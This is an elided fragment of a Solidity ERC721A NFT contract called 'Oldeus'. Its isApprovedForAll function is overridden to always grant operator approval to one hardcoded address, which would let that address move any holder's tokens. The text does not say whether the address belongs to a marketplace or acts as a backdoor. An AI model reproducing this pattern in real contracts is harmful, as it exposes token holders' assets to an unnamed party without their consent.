  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xfd3606086d5FE8e6e7A073761C04d4dde02a5b98){return true;}
...
contract Oldeus is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Oldeus", "OLD", maxBatchSize_, collectionSize_) {
